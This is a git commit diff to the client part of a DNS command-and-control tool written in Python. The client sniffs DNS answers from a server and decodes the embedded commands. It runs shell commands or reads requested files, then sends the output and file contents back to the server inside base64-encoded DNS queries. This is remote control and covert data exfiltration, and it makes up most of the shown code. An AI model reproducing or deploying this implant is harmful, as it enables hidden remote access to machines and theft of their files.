833e1b8b92532661d211886dfa4dc1db54426048
daniel.meshorer <danielmeshorer@gmail.com>
2023-05-01 00:16:23 +0300

    check

--- cyber/c2/dns_c2/client_dns_c2.py
+++ cyber/c2/dns_c2/client_dns_c2.py
@@ -20,49 +20,47 @@ def send_beacon(addr,data):
 
 def parse_packet(packet):
     
-    if  Raw in packet:
+   if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 1:
         global cond
+        print("client in parse")
+        cond = 1
+        #get_an = packet[DNS].qd.rdata
+        get_an =  packet[1][DNSRR].rdata
+        print("answer:")
+        print(get_an)
+        #prefix_packet = check_prefix(get_an)     
+        prefix_packet = check_prefix(base64.b64decode(get_an))
+        print("prefix:")
+        print(prefix_packet)
+        data_recieved = extract_data(get_an,prefix_packet)
+        print("data receieved:")
+        print(data_recieved)
+        #pkt_no_data = IP(dst=SERVER_ADR)/ICMP(type="echo-request")
         
-        if packet.haslayer(DNS): 
-            print("client in parse")
-            cond = 1
-            #get_an = packet[DNS].qd.rdata
-            get_an =  packet[1][DNSRR].rdata
-            print("answer:")
-            print(get_an)
-            #prefix_packet = check_prefix(get_an)     
-            prefix_packet = check_prefix(base64.b64decode(get_an))
-            print("prefix:")
-            print(prefix_packet)
-            data_recieved = extract_data(get_an,prefix_packet)
-            print("data receieved:")
-            print(data_recieved)
-            #pkt_no_data = IP(dst=SERVER_ADR)/ICMP(type="echo-request")
-            
-            if prefix_packet == RUN or prefix_packet == FILE:
-                print("recieved response!")
-                txt_recieved = bin_to_str(data_recieved)     # the plaintxt of the command
-                if prefix_packet == RUN:
-                    output = RunCommand(txt_recieved)
-                    bin_output = bytes(output.encode())
-                    send_qery(SERVER_ADR,base64.b64encode(BEGIN_OUTPUT)+data_recieved,0)
-                    send_qery(SERVER_ADR,base64.b64encode(bin_output),1)
-                    # pkt_send(pkt_no_data,BEGIN_OUTPUT + data_recieved,0)
-                    # pkt_send(pkt_no_data,bin_output,1)
-                else:
-                    output = read_file(txt_recieved)   # read in binary mode
-                    send_qery(SERVER_ADR,base64.b64encode(BEGIN_FILE)+data_recieved,0)
-                    send_qery(SERVER_ADR,base64.b64encode(output),1)
-                    pkt_send(SERVER_ADR,output,1)
-                send_qery(SERVER_ADR,base64.b64encode(EF),0)
-                    
-            cond = 0
-            print("cond changed to " + str(cond))
+        if prefix_packet == RUN or prefix_packet == FILE:
+            print("recieved response!")
+            txt_recieved = bin_to_str(data_recieved)     # the plaintxt of the command
+            if prefix_packet == RUN:
+                output = RunCommand(txt_recieved)
+                bin_output = bytes(output.encode())
+                send_qery(SERVER_ADR,base64.b64encode(BEGIN_OUTPUT)+data_recieved,0)
+                send_qery(SERVER_ADR,base64.b64encode(bin_output),1)
+                # pkt_send(pkt_no_data,BEGIN_OUTPUT + data_recieved,0)
+                # pkt_send(pkt_no_data,bin_output,1)
+            else:
+                output = read_file(txt_recieved)   # read in binary mode
+                send_qery(SERVER_ADR,base64.b64encode(BEGIN_FILE)+data_recieved,0)
+                send_qery(SERVER_ADR,base64.b64encode(output),1)
+                pkt_send(SERVER_ADR,output,1)
+            send_qery(SERVER_ADR,base64.b64encode(EF),0)
+                
+        cond = 0
+        print("cond changed to " + str(cond))
         
 
 def client_listen():
     print("client start listening")
-    sniff_pkt(pfilter="host " + SERVER_ADR,handler=parse_packet)
+    sniff_pkt(pfilter="udp and host " + SERVER_ADR,handler=parse_packet)
     
 
 if __name__=="__main__":
